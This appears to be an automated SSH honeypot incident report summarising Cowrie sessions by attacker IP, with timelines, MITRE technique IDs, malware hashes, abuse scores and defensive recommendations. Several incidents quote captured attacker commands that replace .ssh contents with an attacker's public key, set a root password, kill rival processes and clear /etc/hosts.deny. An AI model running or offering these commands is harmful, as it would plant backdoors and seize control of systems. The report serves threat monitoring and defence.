| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 23:06:43` | `cowrie.session.connect` |
| `2026-05-29 23:06:43` | `cowrie.client.version` |
| `2026-05-29 23:06:43` | `cowrie.client.kex` |
| `2026-05-29 23:06:44` | `cowrie.login.success` |
| `2026-05-29 23:06:44` | `cowrie.session.params` |
| `2026-05-29 23:06:44` | `cowrie.command.input` |
| `2026-05-29 23:06:44` | `cowrie.command.failed` |
| `2026-05-29 23:06:44` | `cowrie.log.closed` |
| `2026-05-29 23:06:45` | `cowrie.session.params` |
| `2026-05-29 23:06:45` | `cowrie.command.input` |
| `2026-05-29 23:06:45` | `cowrie.session.file_download` |
| `2026-05-29 23:06:45` | `cowrie.log.closed` |
| `2026-05-29 23:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.76.176[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.76.176[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49c7d98185b6

| Field | Detail |
|---|---|
| **Source IP** | `87.76.176[.]37` |
| **First Seen** | 2026-05-29 23:06 |
| **Last Seen** | 2026-05-29 23:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 23:06:47` | `cowrie.session.connect` |
| `2026-05-29 23:06:47` | `cowrie.client.version` |
| `2026-05-29 23:06:47` | `cowrie.client.kex` |
| `2026-05-29 23:06:47` | `cowrie.login.success` |
| `2026-05-29 23:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.76.176[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.76.176[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66043a10b2fe

| Field | Detail |
|---|---|
| **Source IP** | `180.184.38[.]93` |
| **First Seen** | 2026-05-29 23:06 |
| **Last Seen** | 2026-05-29 23:07 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 23:06:58` | `cowrie.session.connect` |
| `2026-05-29 23:06:58` | `cowrie.client.version` |
| `2026-05-29 23:06:59` | `cowrie.client.kex` |
| `2026-05-29 23:06:59` | `cowrie.login.success` |
| `2026-05-29 23:07:00` | `cowrie.session.params` |
| `2026-05-29 23:07:00` | `cowrie.command.input` |
| `2026-05-29 23:07:00` | `cowrie.command.failed` |
| `2026-05-29 23:07:00` | `cowrie.log.closed` |
| `2026-05-29 23:07:00` | `cowrie.session.params` |
| `2026-05-29 23:07:00` | `cowrie.command.input` |
| `2026-05-29 23:07:00` | `cowrie.session.file_download` |
| `2026-05-29 23:07:00` | `cowrie.log.closed` |
| `2026-05-29 23:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.38[.]93` to AbuseIPDB if not already reported
- [ ] Block `180.184.38[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ef55ec802e4

| Field | Detail |
|---|---|
| **Source IP** | `41.33.90[.]68` |
| **First Seen** | 2026-05-29 23:07 |
| **Last Seen** | 2026-05-29 23:07 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:WgnbIV4txW67"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 23:07:04` | `cowrie.session.connect` |
| `2026-05-29 23:07:04` | `cowrie.client.version` |
| `2026-05-29 23:07:04` | `cowrie.client.kex` |
| `2026-05-29 23:07:05` | `cowrie.login.success` |
| `2026-05-29 23:07:05` | `cowrie.session.params` |
| `2026-05-29 23:07:05` | `cowrie.command.input` |
| `2026-05-29 23:07:05` | `cowrie.command.failed` |
| `2026-05-29 23:07:05` | `cowrie.log.closed` |
| `2026-05-29 23:07:06` | `cowrie.session.params` |
| `2026-05-29 23:07:06` | `cowrie.command.input` |
| `2026-05-29 23:07:06` | `cowrie.session.file_download` |
| `2026-05-29 23:07:06` | `cowrie.log.closed` |
| `2026-05-29 23:07:34` | `cowrie.session.params` |
| `2026-05-29 23:07:34` | `cowrie.command.input` |
| `2026-05-29 23:07:34` | `cowrie.log.closed` |
| `2026-05-29 23:07:35` | `cowrie.session.params` |
| `2026-05-29 23:07:35` | `cowrie.command.input` |
| `2026-05-29 23:07:35` | `cowrie.log.closed` |
| `2026-05-29 23:07:35` | `cowrie.session.params` |
| `2026-05-29 23:07:35` | `cowrie.command.input` |
| `2026-05-29 23:07:35` | `cowrie.session.file_download` |
| `2026-05-29 23:07:35` | `cowrie.log.closed` |
| `2026-05-29 23:07:36` | `cowrie.session.params` |
| `2026-05-29 23:07:36` | `cowrie.command.input` |
| `2026-05-29 23:07:36` | `cowrie.log.closed` |
| `2026-05-29 23:07:36` | `cowrie.session.params` |
| `2026-05-29 23:07:36` | `cowrie.command.input` |
| `2026-05-29 23:07:36` | `cowrie.log.closed` |
| `2026-05-29 23:07:37` | `cowrie.session.params` |
| `2026-05-29 23:07:37` | `cowrie.command.input` |
| `2026-05-29 23:07:37` | `cowrie.command.input` |
| `2026-05-29 23:07:37` | `cowrie.log.closed` |
| `2026-05-29 23:07:37` | `cowrie.session.params` |
| `2026-05-29 23:07:37` | `cowrie.command.input` |
| `2026-05-29 23:07:38` | `cowrie.log.closed` |
| `2026-05-29 23:07:38` | `cowrie.session.params` |
| `2026-05-29 23:07:38` | `cowrie.command.input` |
| `2026-05-29 23:07:38` | `cowrie.log.closed` |
| `2026-05-29 23:07:38` | `cowrie.session.params` |
| `2026-05-29 23:07:38` | `cowrie.command.input` |
| `2026-05-29 23:07:39` | `cowrie.log.closed` |
| `2026-05-29 23:07:39` | `cowrie.session.params` |
| `2026-05-29 23:07:39` | `cowrie.command.input` |
| `2026-05-29 23:07:39` | `cowrie.log.closed` |
| `2026-05-29 23:07:39` | `cowrie.session.params` |
| `2026-05-29 23:07:39` | `cowrie.command.input` |
| `2026-05-29 23:07:40` | `cowrie.log.closed` |
| `2026-05-29 23:07:40` | `cowrie.session.params` |
| `2026-05-29 23:07:40` | `cowrie.command.input` |
| `2026-05-29 23:07:40` | `cowrie.log.closed` |
| `2026-05-29 23:07:40` | `cowrie.session.params` |
| `2026-05-29 23:07:40` | `cowrie.command.input` |
| `2026-05-29 23:07:41` | `cowrie.log.closed` |
| `2026-05-29 23:07:41` | `cowrie.session.params` |
| `2026-05-29 23:07:41` | `cowrie.command.input` |
| `2026-05-29 23:07:41` | `cowrie.log.closed` |
| `2026-05-29 23:07:41` | `cowrie.session.params` |
| `2026-05-29 23:07:41` | `cowrie.command.input` |
| `2026-05-29 23:07:42` | `cowrie.log.closed` |
| `2026-05-29 23:07:42` | `cowrie.session.params` |
| `2026-05-29 23:07:42` | `cowrie.command.input` |
| `2026-05-29 23:07:42` | `cowrie.log.closed` |
| `2026-05-29 23:07:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.33.90[.]68` to AbuseIPDB if not already reported
- [ ] Block `41.33.90[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e874e76bfdae

| Field | Detail |
|---|---|
| **Source IP** | `180.184.38[.]93` |
| **First Seen** | 2026-05-29 23:07 |
| **Last Seen** | 2026-05-29 23:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 23:07:16` | `cowrie.session.connect` |
| `2026-05-29 23:07:16` | `cowrie.client.version` |
| `2026-05-29 23:07:16` | `cowrie.client.kex` |
| `2026-05-29 23:07:16` | `cowrie.login.success` |
| `2026-05-29 23:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.38[.]93` to AbuseIPDB if not already reported
- [ ] Block `180.184.38[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f95e9dde3c8

| Field | Detail |
|---|---|
| **Source IP** | `168.167.228[.]123` |
| **First Seen** | 2026-05-29 23:09 |
| **Last Seen** | 2026-05-29 23:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 23:09:58` | `cowrie.session.connect` |
| `2026-05-29 23:09:58` | `cowrie.client.version` |
| `2026-05-29 23:09:59` | `cowrie.client.kex` |
| `2026-05-29 23:10:00` | `cowrie.login.success` |
| `2026-05-29 23:10:01` | `cowrie.session.params` |
| `2026-05-29 23:10:01` | `cowrie.command.input` |
| `2026-05-29 23:10:01` | `cowrie.command.failed` |
| `2026-05-29 23:10:01` | `cowrie.log.closed` |
| `2026-05-29 23:10:02` | `cowrie.session.params` |
| `2026-05-29 23:10:02` | `cowrie.command.input` |
| `2026-05-29 23:10:02` | `cowrie.session.file_download` |
| `2026-05-29 23:10:02` | `cowrie.log.closed` |
| `2026-05-29 23:10:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.167.228[.]123` to AbuseIPDB if not already reported
- [ ] Block `168.167.228[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3c8f6574000

| Field | Detail |
|---|---|
| **Source IP** | `168.167.228[.]123` |
| **First Seen** | 2026-05-29 23:10 |
| **Last Seen** | 2026-05-29 23:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 23:10:05` | `cowrie.session.connect` |
| `2026-05-29 23:10:05` | `cowrie.client.version` |
| `2026-05-29 23:10:06` | `cowrie.client.kex` |
| `2026-05-29 23:10:07` | `cowrie.login.success` |
| `2026-05-29 23:10:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.167.228[.]123` to AbuseIPDB if not already reported
- [ ] Block `168.167.228[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44bc6ad332f6

| Field | Detail |
|---|---|
| **Source IP** | `101.126.155[.]86` |
| **First Seen** | 2026-05-29 23:11 |
| **Last Seen** | 2026-05-29 23:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 23:11:03` | `cowrie.session.connect` |
| `2026-05-29 23:11:03` | `cowrie.client.version` |
| `2026-05-29 23:11:04` | `cowrie.client.kex` |
| `2026-05-29 23:11:04` | `cowrie.login.success` |
| `2026-05-29 23:11:05` | `cowrie.session.params` |
| `2026-05-29 23:11:05` | `cowrie.command.input` |
| `2026-05-29 23:11:05` | `cowrie.command.failed` |
| `2026-05-29 23:11:05` | `cowrie.log.closed` |
| `2026-05-29 23:11:05` | `cowrie.session.params` |
| `2026-05-29 23:11:05` | `cowrie.command.input` |
| `2026-05-29 23:11:05` | `cowrie.session.file_download` |
| `2026-05-29 23:11:05` | `cowrie.log.closed` |
| `2026-05-29 23:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.155[.]86` to AbuseIPDB if not already reported
- [ ] Block `101.126.155[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f42efe5b899

| Field | Detail |
|---|---|
| **Source IP** | `101.126.155[.]86` |
| **First Seen** | 2026-05-29 23:11 |
| **Last Seen** | 2026-05-29 23:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 23:11:13` | `cowrie.session.connect` |
| `2026-05-29 23:11:13` | `cowrie.client.version` |
| `2026-05-29 23:11:14` | `cowrie.client.kex` |
| `2026-05-29 23:11:14` | `cowrie.login.success` |
| `2026-05-29 23:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.155[.]86` to AbuseIPDB if not already reported
- [ ] Block `101.126.155[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `135.148.33[.]168` | **95** | 2026-05-29 20:30 | 2026-05-29 23:16 | 60m | 0 | `T1592` | 🟠 MEDIUM |
| `118.39.234[.]65` | **15** | 2026-05-29 20:56 | 2026-05-29 21:20 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.138.6[.]3` | **15** | 2026-05-29 20:46 | 2026-05-29 21:18 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `81.192.46[.]36` | **4** | 2026-05-29 20:57 | 2026-05-29 21:07 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `41.33.90[.]68` | **2** | 2026-05-29 23:07 | 2026-05-29 23:09 | 4m | 0 | `T1592` | 🟢 LOW |
| `101.126.155[.]86` | 1 | 2026-05-29 23:11 | 2026-05-29 23:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.126.89[.]144` | 1 | 2026-05-29 23:04 | 2026-05-29 23:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.151.72[.]155` | 1 | 2026-05-29 23:11 | 2026-05-29 23:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.228[.]55` | 1 | 2026-05-29 22:28 | 2026-05-29 22:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.242[.]127` | 1 | 2026-05-29 22:34 | 2026-05-29 22:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.34[.]72` | 1 | 2026-05-29 22:22 | 2026-05-29 22:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `168.167.228[.]123` | 1 | 2026-05-29 23:10 | 2026-05-29 23:10 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.38[.]93` | 1 | 2026-05-29 23:07 | 2026-05-29 23:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.244.5[.]153` | 1 | 2026-05-29 23:02 | 2026-05-29 23:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `188.240.59[.]44` | 1 | 2026-05-29 20:38 | 2026-05-29 20:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.76.176[.]37` | 1 | 2026-05-29 23:06 | 2026-05-29 23:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 8 |
| `118.145.242[.]127` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 1 |
| `188.240.59[.]44` | GB | Infrawatch Limited | **100** ⚠️ | 9 |
| `118.145.228[.]55` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 8 |
| `41.33.90[.]68` | EG | TE Data | **100** ⚠️ | 6 |
| `120.138.6[.]3` | IN | Asia Pacific Network Information Centre | **100** ⚠️ | 26 |
| `81.192.46[.]36` | MA | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | **100** ⚠️ | 50 |
| `118.39.234[.]65` | KR | Korea Telecom | **100** ⚠️ | 21 |
| `87.76.176[.]37` | JP | Lamis Ukraine LLC | **100** ⚠️ | 8 |
| `115.151.72[.]155` | CN | CHINANET JIANGXI PROVINCE NETWORK | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 81 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 37 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 36 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 19 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 19 |

---

## 🔕 False Positive Summary (56 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 25 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 26 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 235 cases |
| Tool 34  | Credential Extractor        | ✅ 73 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 24 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 56 filtered (23.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
